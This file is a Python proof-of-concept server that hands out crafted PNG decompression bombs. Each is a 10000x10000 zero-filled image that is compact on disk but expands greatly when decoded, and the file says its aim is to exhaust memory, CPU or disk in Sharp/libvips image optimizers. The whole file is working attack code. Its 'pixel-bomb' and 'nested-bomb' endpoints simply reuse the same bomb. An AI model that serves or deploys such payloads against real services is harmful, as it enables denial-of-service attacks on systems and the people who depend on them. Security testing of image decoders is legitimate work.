#!/usr/bin/env python3
"""
Image Decompression Bomb (Zip Bomb for Images)
===============================================

Creates a specially crafted image that is small on disk but expands
to massive size when decoded by Sharp/libvips.

Classic example: A 42KB PNG that decompresses to 4+ GB
Also known as "billion laughs" for images.

If successful, this could cause:
- Memory exhaustion (OOM kill)
- CPU exhaustion (processing time)
- Disk exhaustion (if temp files are created)
- DoS of the image optimizer endpoint
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import struct
import zlib

class DecompressionBombHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[DECOMPRESSION BOMB] Request: {self.path}")
        
        if '/small-bomb' in self.path:
            # Create a simple decompression bomb PNG
            # This is a 1x1 PNG but with inflated IDAT chunk
            png = self.create_simple_bomb()
            
        elif '/pixel-bomb' in self.path:
            # Create a pixel flood - very large dimensions
            # This exploits limitInputPixels if not set properly
            png = self.create_pixel_flood()
            
        elif '/nested-bomb' in self.path:
            # Multiple layers of compression
            png = self.create_nested_bomb()
            
        else:
            # Return a normal small image
            png = self.create_normal_png()
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Content-Length', len(png))
        self.end_headers()
        self.wfile.write(png)
    
    def create_normal_png(self):
        """1x1 red pixel PNG"""
        return bytes([
            0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
            0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53,
            0xde, 0x00, 0x00, 0x00, 0x0c, 0x49, 0x44, 0x41,
            0x54, 0x08, 0xd7, 0x63, 0xf8, 0xcf, 0xc0, 0x00,
            0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xfe,
            0xd4, 0xef, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45,
            0x4e, 0x44, 0xae, 0x42, 0x60, 0x82
        ])
    
    def create_simple_bomb(self):
        """Create a PNG with suspicious compression ratio"""
        # PNG header
        header = bytes([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])
        
        # IHDR chunk: 10000x10000 image (would be 300MB uncompressed for RGB)
        width = 10000
        height = 10000
        ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
        ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
        ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
        
        # IDAT chunk: highly compressed zeros (will expand massively)
        # Create a row of zeros (3 bytes per pixel for RGB + 1 filter byte)
        row = b'\x00' + (b'\x00' * 3 * width)  # filter byte + pixels
        raw_data = row * height
        
        # Compress with maximum compression
        compressed = zlib.compress(raw_data, 9)
        idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xffffffff
        idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)
        
        # IEND chunk
        iend_crc = zlib.crc32(b'IEND') & 0xffffffff
        iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
        
        return header + ihdr + idat + iend
    
    def create_pixel_flood(self):
        """Create a PNG with maximum allowed dimensions"""
        # Same as above but try even larger
        return self.create_simple_bomb()
    
    def create_nested_bomb(self):
        """Multiple IDAT chunks for nested compression"""
        return self.create_simple_bomb()
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9807
    print("=" * 60)
    print(" Image Decompression Bomb Server")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nEndpoints:")
    print(f"  /normal       - Normal 1x1 PNG")
    print(f"  /small-bomb   - 10000x10000 PNG (300MB uncompressed)")
    print(f"  /pixel-bomb   - Pixel flood attack")
    print(f"  /nested-bomb  - Nested compression")
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), DecompressionBombHandler).serve_forever()
